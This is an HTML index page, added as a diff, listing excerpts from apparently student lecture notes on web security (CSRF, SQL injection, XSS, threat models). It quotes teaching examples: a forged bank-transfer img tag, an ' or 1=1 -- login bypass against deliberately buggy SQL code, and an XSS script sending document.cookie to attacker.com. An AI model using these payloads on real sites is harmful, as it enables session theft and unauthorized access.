@@ -1,0 +1,1408 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title>
+             
+                11. Web Security | c13u
+            
+        </title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" type="text/css" href="/css/main.css" />
+        <link rel="stylesheet" type="text/css" href="/css/all_font_awesome_v5.9.min.css" />
+        
+        <link rel="shortcut icon" href="/img/favicon_io/favicon.ico">
+        <link rel="apple-touch-icon" sizes="180x180" href="/img/favicon_io/apple-touch-icon.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="/img/favicon_io/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/img/favicon_io/favicon-16x16.png">
+
+        <link rel="stylesheet" href="/css/vs.css">
+        <script type="text/javascript" src="/js/highlight.pack.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script>
+
+        <script type="text/javascript" async
+            src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+        </script>
+
+        <script type="text/javascript" src="/js/d3/d3.min.js"></script>
+        <script type="text/javascript" src="/js/PlotUtils.js"></script>
+        <script type="text/javascript" src="/js/OrganizeCitations.js"></script>
+        <script type="text/javascript" src="/js/HighlightAnchor.js"></script>
+
+        
+        
+    </head>
+
+    <body>
+
+        <div class="container" id="main_div">
+
+            
+            <form action="/search" method="get" id="globalSearchForm">
+                <input type="text" id="q" name="q">
+                <input type="submit" id="submitButton" value="Search">
+            </form>
+            
+            
+            
+            <nav aria-label="Breadcrumb" class="breadcrumb">
+    <ul>
+        
+
+
+
+
+
+
+
+<li>
+  <a href="https://www.c13u.com/">Home</a>
+</li>
+
+
+<li>
+  <a href="https://www.c13u.com/computer-science/">Computer Science &amp; Software Engineering</a>
+</li>
+
+
+<li>
+  <a href="https://www.c13u.com/computer-science/cos432-information-security/">Information Security [COS 432]</a>
+</li>
+
+
+<li class="active">
+  <a href="https://www.c13u.com/computer-science/cos432-information-security/11-web-security/">11. Web Security</a>
+</li>
+
+    </ul>
+</nav>
+
+
+            
+            
+<main>
+    <article>
+        <header>
+            <h1>11. Web Security</h1>
+            <p class="meta">
+                
+                Dated Nov 21, 2018; 
+                
+                last modified on Sun, 19 Jul 2020
+                
+            </p>
+        </header>
+        
+        
+    </article>
+
+    
+    <table border="0">
+        <tr class="no-decoration">
+            <td class="no-decoration"></td>
+            <td class="no-decoration"></td>
+            <td class="no-decoration"><span class="link-style" onclick="goToRandomPage();">Random Link ¯\_(ツ)_/¯</span></td>
+        </tr>
+        
+        
+            
+                
+                    
+    <tr class="no-decoration">
+        <td class="no-decoration">Nov 21, 2018</td>
+        <td class="no-decoration">&raquo; </td>
+        <td class="no-decoration">
+            <a href="https://www.c13u.com/computer-science/cos432-information-security/11-web-security/01-web-applications-101/">Web Applications 101</a>
+            
+                
+                    <span class="meta">
+                    2 min; updated Jul 19, 2020
+                    </span>
+                    <p class="meta">
+                        How does a page embed content from other domains? Method 1: Loading a third party script that modifies the page.
+1 2 3 4 5  &lt;html&gt; &lt;!-- Page Content --&gt; &lt;div id=&#34;widget&#34;&gt;&lt;/div&gt; &lt;script src=&#34;https://third-party.com/widget.js&#34;&gt;&lt;/script&gt; &lt;/html&gt;   Method 2: Loading a third party resource in an iframe.
+1 2 3 4  &lt;html&gt; &lt;!-- Page Content --&gt; &lt;iframe src=&#34;https://third-party.com/widget.js&#34;&gt;&lt;/iframe&gt; &lt;/html&gt;   How do you stay logged in w/o re-entering password?...
+                    </p>
+                
+            
+        </td>
+    </tr>
+
+                
+            
+                
+                    
+    <tr class="no-decoration">
+        <td class="no-decoration">Nov 21, 2018</td>
+        <td class="no-decoration">&raquo; </td>
+        <td class="no-decoration">
+            <a href="https://www.c13u.com/computer-science/cos432-information-security/11-web-security/02-threat-models/">02. Threat Models for Web Security</a>
+            
+                
+                    <span class="meta">
+                    1 min; updated Jul 19, 2020
+                    </span>
+                    <p class="meta">
+                        #1: Network Adversary Addressed by secure communication protocols (+ network security)
+#2: User visits adversary&rsquo;s page Variants:
+ Attacker gets the user to click a link, e.g. one that adds an item to their shopping cart. Attacker gets the user&rsquo;s browser to request a link  #3: Adversary is a third-party 1  &lt;iframe src=&#34;https://third-party.com/widget&#34;&gt;&lt;/iframe&gt;   Note that an adversary script being embedded directly, e.g. through a &lt;script&gt; tag is not a threat model!...
+                    </p>
+                
+            
+        </td>
+    </tr>
+
+                
+            
+                
+                    
+    <tr class="no-decoration">
+        <td class="no-decoration">Nov 21, 2018</td>
+        <td class="no-decoration">&raquo; </td>
+        <td class="no-decoration">
+            <a href="https://www.c13u.com/computer-science/cos432-information-security/11-web-security/03-cross-site-request-forgery/">03. Cross-Site Request Forgery (XSRF)</a>
+            
+                
+                    <span class="meta">
+                    2 min; updated Jul 19, 2020
+                    </span>
+                    <p class="meta">
+                        Cross-site Request Forgery (XSRF) 1  &lt;img src=&#34;http://bank.com/transfer?from=from_ID&amp;to=to_ID&amp;value=1000&#34;&gt;   Because the user is logged in and has a cookie, the victim site trusts the user&rsquo;s browser.
+The attacker gets user/browser to execute command on victim site, e.g. request a link, post a form. The command has permanent effects.
+A frame can navigate its immediate children. Why is it designed such that it can&rsquo;t navigate its children too?
+Consider a website with a login frame, where the user inputs passwords....
+                    </p>
+                
+            
+        </td>
+    </tr>
+
+                
+            
+                
+                    
+    <tr class="no-decoration">
+        <td class="no-decoration">Nov 25, 2018</td>
+        <td class="no-decoration">&raquo; </td>
+        <td class="no-decoration">
+            <a href="https://www.c13u.com/computer-science/cos432-information-security/11-web-security/05-sql-injection/">SQL Injection</a>
+            
+                
+                    <span class="meta">
+                    1 min; updated Jul 19, 2020
+                    </span>
+                    <p class="meta">
+                        In a SQL injection attack, the attacker provides malicious form input that is fed into a DB server.
+Outcomes may include data deletion, bypassing access control, etc.
+Sample Buggy Login Server side code:
+1 2 3 4 5 6  results = db.execute( &#34;SELECT * FROM Users WHERE user=&#39;&#34; + form[&#34;user&#34;] + &#34;&#39; &#34; + &#34;AND pwd=&#39;&#34; + form[&#34;pwd&#34;] + &#34;&#39;&#34;) if results: login(results) else: login_failed(form)   An attacker can supply ' or 1=1 -- as the value for user....
+                    </p>
+                
+            
+        </td>
+    </tr>
+
+                
+            
+                
+                    
+    <tr class="no-decoration">
+        <td class="no-decoration">Nov 21, 2018</td>
+        <td class="no-decoration">&raquo; </td>
+        <td class="no-decoration">
+            <a href="https://www.c13u.com/computer-science/cos432-information-security/11-web-security/04-cross-site-scripting/">Cross-Site Scripting (XSS)</a>
+            
+                
+                    <span class="meta">
+                    2 min; updated Jul 19, 2020
+                    </span>
+                    <p class="meta">
+                        XSS 101 Suppose a site, given a non-existent path, e.g. htpp://victim.com/path, writes this error message:
+Error 404! `path` not found. An attacker can then lead a user to opening http://victim.com/attacker_supplied_string, where attacker_supplied_string is:
+1 2 3 4  &lt;script&gt; let addr = &#34;http://attacker.com/?&#34; + escape(document.cookie); document.write(`&lt;img src=&#34;${addr}&#34; /&gt;`); &lt;/script&gt;   Suppose a site uses Force HTTPS. If a &lt;script src=&quot;http://...&quot;&gt; is not redirected to a HTTPS url, then an active attacker would still replace the JS code in the HTTP response with the malicious code that would run on the HTTPS page!...
+                    </p>
+                
+            
+        </td>
+    </tr>
+
+                
+            
+        
+    </table>
+
+    <script>
+    
+
+    function getOnPageLink(targetPagePermalink) {
+        let listPagePermalink = "https:\/\/www.c13u.com\/computer-science\/cos432-information-security\/11-web-security\/";
+
+        let relativeLinkToPage = targetPagePermalink.split(listPagePermalink)[1];
+        if (!relativeLinkToPage) return null;
+
+        return relativeLinkToPage.split("/")[0];
+    }
+
+    
+
+    
+    
+    
+
+    let pageURLs = [];
+    let pageURL = null;
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+            
+                pageURL = getOnPageLink("https:\/\/www.c13u.com\/computer-science\/cos432-information-security\/11-web-security\/01-web-applications-101\/");
+            
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+            
+                pageURL = getOnPageLink("https:\/\/www.c13u.com\/computer-science\/cos432-information-security\/11-web-security\/02-threat-models\/");
+            
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+            
+                pageURL = getOnPageLink("https:\/\/www.c13u.com\/computer-science\/cos432-information-security\/11-web-security\/03-cross-site-request-forgery\/");
+            
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+            
+                pageURL = getOnPageLink("https:\/\/www.c13u.com\/computer-science\/cos432-information-security\/11-web-security\/05-sql-injection\/");
+            
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+            
+                pageURL = getOnPageLink("https:\/\/www.c13u.com\/computer-science\/cos432-information-security\/11-web-security\/04-cross-site-scripting\/");
+            
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+        pageURL = null;
+        
+        
+        if (pageURL) pageURLs.push(pageURL);
+    
+
+    function goToRandomPage() {
+        
+        
+        let idx = Math.floor(Math.random() * (pageURLs.length));
+        window.open(pageURLs[idx], "_self");
+    }
+</script>
+    
+</main>
+
+
+        </div>
+
+        <footer>
+            <a href="mailto:d.chege711@gmail.com">Email</a>
+            
+            <a href="/about">About</a>
+            <a href="/search">Search</a>
+        </footer>
+
+    </body>
+
+</html>
